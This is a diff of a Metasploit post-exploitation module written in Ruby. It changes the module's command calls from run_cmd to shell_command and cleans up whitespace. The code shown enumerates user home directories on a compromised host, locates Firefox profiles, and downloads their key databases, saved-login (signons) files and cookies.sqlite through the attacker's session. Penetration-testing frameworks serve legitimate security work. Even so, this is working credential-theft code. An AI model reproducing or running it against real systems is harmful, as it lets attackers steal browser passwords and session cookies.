@@ -93,13 +93,13 @@ class Metasploit3 < Msf::Post
 		end
 
 		if got_root?
-			userdirs = session.run_cmd("ls #{home}").gsub(/\s/, "\n")
+			userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
 			userdirs << "/root\n"
 		else
 			print_status("We do not have root privileges")
 			print_status("Checking #{id} account for Firefox")
-			firefox = session.run_cmd("ls #{home}#{id}/.mozilla/firefox/").gsub(/\s/, "\n")
-			
+			firefox = session.shell_command("ls #{home}#{id}/.mozilla/firefox/").gsub(/\s/, "\n")
+
 			firefox.each_line do |profile|
 				profile.chomp!
 				next if profile =~ /No such file/i
@@ -125,8 +125,8 @@ class Metasploit3 < Msf::Post
 
 			print_status("Checking for Firefox Profile in: #{dir}")
 
-			stat = session.run_cmd("ls #{dir}")
-		 	if stat =~ /No such file/i
+			stat = session.shell_command("ls #{dir}")
+			if stat =~ /No such file/i
 				print_error("Mozilla not found in #{dir}")
 				next
 			end
@@ -209,7 +209,7 @@ class Metasploit3 < Msf::Post
 			print_error("Profiles directory missing")
 			return
 		end
-		
+
 		if paths.empty?
 			return nil
 		else
@@ -247,12 +247,12 @@ class Metasploit3 < Msf::Post
 				end
 			end
 			if session.type != "meterpreter"
-				files = session.run_cmd("ls #{path}").gsub(/\s/, "\n")
+				files = session.shell_command("ls #{path}").gsub(/\s/, "\n")
 				files.each_line do |file|
 					file.chomp!
 					if file =~ /key\d\.db/ or file =~ /signons/i or file =~ /cookies\.sqlite/
 						print_good("Downloading #{file}\\")
-						data = session.run_cmd("cat #{path}#{file}")
+						data = session.shell_command("cat #{path}#{file}")
 						ext = file.split('.')[2]
 						if ext == "txt"
 							mime = "plain"
@@ -289,7 +289,7 @@ class Metasploit3 < Msf::Post
 		if @platform == :windows
 			return session.fs.file.expand_path("%USERNAME%")
 		else
-			return session.run_cmd("whoami").chomp
+			return session.shell_command("whoami").chomp
 		end
 	end
 end
